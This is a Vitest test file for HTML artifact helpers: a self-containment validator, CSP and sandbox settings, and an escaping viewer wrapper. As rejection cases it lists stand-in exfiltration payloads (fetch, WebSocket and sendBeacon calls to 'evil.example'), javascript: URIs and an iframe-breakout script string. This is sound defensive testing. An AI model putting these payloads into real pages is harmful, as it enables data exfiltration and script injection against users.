/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  ARTIFACT_CSP,
  ARTIFACT_SANDBOX,
  MAX_ARTIFACT_BYTES,
  sanitizeArtifactTitle,
  validateSelfContained,
  wrapArtifactHtml,
  byteLength,
} from './html.js';

describe('artifact html helpers', () => {
  describe('MAX_ARTIFACT_BYTES', () => {
    it('is 16 MB', () => {
      expect(MAX_ARTIFACT_BYTES).toBe(16 * 1024 * 1024);
    });
  });

  describe('sanitizeArtifactTitle', () => {
    it('collapses whitespace and trims', () => {
      expect(sanitizeArtifactTitle('  PR   walkthrough\n ')).toBe(
        'PR walkthrough',
      );
    });
    it('falls back to a default when empty/undefined', () => {
      expect(sanitizeArtifactTitle(undefined)).toBe('Artifact');
      expect(sanitizeArtifactTitle('   ')).toBe('Artifact');
    });
    it('clamps very long titles', () => {
      expect(sanitizeArtifactTitle('x'.repeat(500)).length).toBe(120);
    });
  });

  describe('validateSelfContained', () => {
    it('accepts an inline, body-only fragment', () => {
      const ok = `<h1>Hello</h1><style>.a{color:red}</style><script>const x=1;</script>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('accepts data: URI assets', () => {
      const ok = `<img src="data:image/png;base64,iVBOR=" alt="x">`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('accepts scripts that generate image data locally', () => {
      expect(
        validateSelfContained(
          '<canvas id="c"></canvas><script>const img = new Image(); img.src = document.querySelector("#c").toDataURL();</script>',
        ),
      ).toBeNull();
    });

    it.each([
      '<script>const u = URL.createObjectURL(blob)</script>',
      '<script>canvas.toDataURL("image/png")</script>',
      '<script>new URL("./data", document.baseURI)</script>',
      '<script>URL.revokeObjectURL(u)</script>',
      "<script>o.innerHTML = '<img src=\"' + dataUrl + '\">'</script>",
      '<img alt="Set src=x in the config" src="data:image/png;base64,iVBOR=">',
      '<script>fetch("data:application/json,{}")</script>',
      '<pre><code>fetch(&quot;/api/users&quot;)</code></pre>',
      '<style>@import url(data:text/css;base64,Ym9keXt9);</style>',
      '<img src="" alt="placeholder">',
    ])('preserves existing self-contained input support: %s', (html) => {
      expect(validateSelfContained(html)).toBeNull();
    });

    it('accepts external hyperlinks', () => {
      const ok = `<a href="https://github.com/QwenLM/qwen-code/pull/1">PR</a>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('allows document tags mentioned in a leading comment or body text', () => {
      // Regression: the wrapper check looks only at the start (after leading
      // comments), so mentioning these tags in a comment or escaped code
      // sample must not be falsely rejected.
      const ok = `<!-- body-only fragment: no <html>/<head>/<body> --><p>Use the &lt;body&gt; element</p><pre><code>&lt;html&gt;</code></pre>`;
      expect(validateSelfContained(ok)).toBeNull();
    });

    it('rejects an empty fragment', () => {
      expect(validateSelfContained('   ')).toMatch(/empty/i);
    });

    it.each([
      ['<!doctype html><p>x</p>', /full-document/i],
      ['<html><body>x</body></html>', /full-document/i],
      ['<head><title>x</title></head>', /full-document/i],
    ])('rejects full-document wrapper %s', (frag, re) => {
      expect(validateSelfContained(frag)).toMatch(re);
    });

    it.each([
      '<script src="https://cdn.example.com/x.js"></script>',
      '<link rel="stylesheet" href="https://fonts.example.com/x.css">',
      '<img srcset="https://cdn.example.com/a.png 1x">',
      '<img src=&quot;https://cdn.example.com/a.png&quot;>',
      '<img src="//cdn.example.com/a.png">',
      '<video poster="https://cdn.example.com/poster.png"></video>',
      '<script src="http://evil/x.js"></script>',
    ])('rejects external resource %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<style>@import url(https://fonts.example.com/f.css);</style>',
      '<style>@import "https://fonts.example.com/f.css";</style>',
      '<style>body{background:url("https://cdn/x.png")}</style>',
      '<style>@font-face{src:url(//cdn/f.woff2)}</style>',
    ])('rejects external CSS %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<script>fetch("https://evil.example/upload")</script>',
      '<script>new WebSocket("wss://evil.example/ws")</script>',
      '<script>XMLHttpRequest("https://evil.example/x")</script>',
      '<script>import("https://evil.example/x.js")</script>',
      '<script>window.open("https://evil.example")</script>',
      '<script>location.assign("https://evil.example")</script>',
      '<script>navigator.sendBeacon("https://evil.example", "x")</script>',
      '<meta http-equiv="refresh" content="0; url=https://evil.example">',
    ])('rejects browser network egress %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });

    it.each([
      '<a href="javascript:alert(1)">click</a>',
      '<a href=&quot;javascript:alert(1)&quot;>click</a>',
    ])('rejects javascript URIs %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/javascript: URI/i);
    });

    // Navigation/egress constructs the hardened validator rejects as defence in
    // depth (the sandboxed viewer is the real boundary). Each of these PASSED
    // the HEAD validator, so these cases fail on the old code.
    it.each([
      "<script>location = 'http://127.0.0.1/x'</script>",
      "<script>window.location = 'http://127.0.0.1/x'</script>",
      "<script>document.location = 'http://127.0.0.1/x'</script>",
      "<script>top.location = 'http://127.0.0.1/x'</script>",
      "<script>parent.location.href = 'http://127.0.0.1/x'</script>",
      '<meta http-equiv="refresh" content="5">',
      '<base href="/app/">',
      '<link rel="dns-prefetch" href="//cdn.example">',
      '<link rel="preconnect" href="//cdn.example">',
      '<link rel="prefetch" href="/x">',
      '<link rel="prerender" href="/x">',
      '<link rel="modulepreload" href="/x.js">',
      '<link rel="&#112;rerender" href="/x">',
      '<LINK REL=icon href="data:,">',
      '<script type="speculationrules">{"prefetch":[]}</script>',
      '<script>navigator.serviceWorker.register("/sw.js")</script>',
      '<script>new RTCPeerConnection()</script>',
      '<script>new webkitRTCPeerConnection()</script>',
    ])('rejects navigation/egress construct %s', (frag) => {
      expect(validateSelfContained(frag)).toMatch(/self-contained/i);
    });
  });

  describe('ARTIFACT_CSP / ARTIFACT_SANDBOX', () => {
    // These directives/tokens are what close the egress battery; they fail on
    // the HEAD policy (script-src 'unsafe-inline', sandbox allow-scripts).
    it('disables scripts and remote loads', () => {
      expect(ARTIFACT_CSP).toContain("script-src 'none'");
      expect(ARTIFACT_CSP).toContain("default-src 'none'");
      expect(ARTIFACT_CSP).toContain("connect-src 'none'");
      expect(ARTIFACT_CSP).toContain("frame-src 'none'");
      expect(ARTIFACT_CSP).toContain("child-src 'none'");
      expect(ARTIFACT_CSP).toContain("object-src 'none'");
      expect(ARTIFACT_CSP).toContain("form-action 'none'");
      expect(ARTIFACT_CSP).toContain("base-uri 'none'");
      expect(ARTIFACT_CSP).toContain('img-src data:');
      // Inline <style> is allowed; inline/remote script is not.
      expect(ARTIFACT_CSP).not.toContain("script-src 'unsafe-inline'");
    });

    it('uses an empty (no allow-scripts) iframe sandbox', () => {
      expect(ARTIFACT_SANDBOX).toBe('');
    });
  });

  describe('wrapArtifactHtml viewer', () => {
    it('is a script-free viewer embedding a sandboxed srcdoc iframe', () => {
      const html = wrapArtifactHtml('<h1>Hi</h1>', 'My Page');
      expect(html).toMatch(/^<!doctype html>/i);
      expect(html).toContain('<title>My Page</title>');
      expect(html).toContain(`content="${ARTIFACT_CSP}"`);
      expect(html).toContain('x-dns-prefetch-control');
      // The viewer document itself carries no script.
      expect(html).not.toMatch(/<script/i);
      // Exactly one iframe, sandbox attribute present and empty.
      expect(html.match(/<iframe\b/gi)).toHaveLength(1);
      expect(html).toContain('<iframe sandbox="" ');
      expect(html).not.toContain('allow-scripts');
      expect(html).not.toContain('allow-top-navigation');
      expect(html).not.toContain('allow-popups');
      expect(html).not.toContain('allow-forms');
      expect(html).not.toContain('allow-same-origin');
      expect(html).not.toContain('allow-modals');
      expect(html).not.toContain('allow-downloads');
    });

    it('carries the artifact only inside the escaped srcdoc', () => {
      const html = wrapArtifactHtml('<h1>Report</h1>', 'My Page');
      // Raw fragment markup never appears in the viewer document itself.
      expect(html).not.toContain('<h1>Report</h1>');
      expect(html).toContain('srcdoc="');
      expect(html).toContain('&lt;h1&gt;Report&lt;/h1&gt;');
    });

    it('a quote / </iframe> / & in the artifact cannot break out', () => {
      const html = wrapArtifactHtml(
        '</iframe>"><script>bad()</script> A&B',
        'T',
      );
      // Nothing in the fragment reaches the viewer as live markup.
      expect(html).not.toContain('</iframe>"><script>');
      expect(html).not.toMatch(/<script[^>]*>bad\(\)/);
      // One opening + one closing iframe tag only (the viewer's own).
      expect(html.match(/<iframe\b/gi)).toHaveLength(1);
      expect(html.match(/<\/iframe>/gi)).toHaveLength(1);
      expect(html).toContain('&lt;/iframe&gt;');
      expect(html).toContain('&quot;&gt;&lt;script&gt;');
      expect(html).toContain('A&amp;B');
    });

    it('escapes the title in both element and attribute contexts', () => {
      const html = wrapArtifactHtml('<p>x</p>', 'a<b>&"c');
      expect(html).toContain('<title>a&lt;b&gt;&amp;"c</title>');
      expect(html).toContain('title="a&lt;b&gt;&amp;&quot;c"');
    });

    it('uses the default title when none given', () => {
      expect(wrapArtifactHtml('<p>x</p>', undefined)).toContain(
        '<title>Artifact</title>',
      );
    });
  });

  describe('byteLength', () => {
    it('counts UTF-8 bytes', () => {
      expect(byteLength('abc')).toBe(3);
      expect(byteLength('你好')).toBe(6);
    });
  });
});
